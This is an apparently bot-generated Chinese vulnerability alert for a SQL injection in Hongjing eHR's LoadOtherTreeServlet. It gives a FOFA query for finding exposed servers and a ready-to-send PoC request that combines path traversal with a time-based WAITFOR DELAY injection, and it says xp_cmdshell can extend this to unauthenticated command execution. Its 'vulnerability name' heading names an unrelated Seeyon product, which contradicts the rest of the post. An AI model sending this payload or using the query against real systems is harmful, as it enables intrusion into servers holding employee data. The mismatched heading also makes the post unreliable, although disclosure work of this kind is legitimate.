#  [含POC]宏景eHR LoadOtherTreeServlet SQL注入漏洞   
原创 漏洞预警机器人  安全光圈   2024-07-04 20:39  
  
# 宏景eHR LoadOtherTreeServlet SQL注入漏洞  
  
免责声明：本文内容为机器人搜集最新漏洞及POC分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！  
## 漏洞名称  
  
致远互联FE协作办公平台 ncsubjass SQL注入致RCE漏洞  
## 漏洞描述  
  
宏景eHR人力资源管理软件是一款人力资源管理与数字化应用相融合，满足动态化、协同化、流程化、战略化需求的软件。  
  
宏景eHR LoadOtherTreeServlet 接口处存在SQL注入漏洞，,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g1X9cMsc6D0KSBLeNmouBib7G9icKC6OqK8jgXhBah0CtPKEtaSRPdlhsll8kic7iaROj4J1bORrzwrs3x9fEWzA8w/640?wx_fmt=png&from=appmsg "null")  
## FOFA语句  
```
app="HJSOFT-HCM"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g1X9cMsc6D0KSBLeNmouBib7G9icKC6OqKibBw3BrbkBfoVzBiaR4Xx29sqSiaNaUujX1yXiaWZwjBFT3uPkP8QEXQMA/640?wx_fmt=png&from=appmsg "null")  
## POC  
```
GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&flag=1 HTTP/1.1
Host: your-ip
```  
  
  
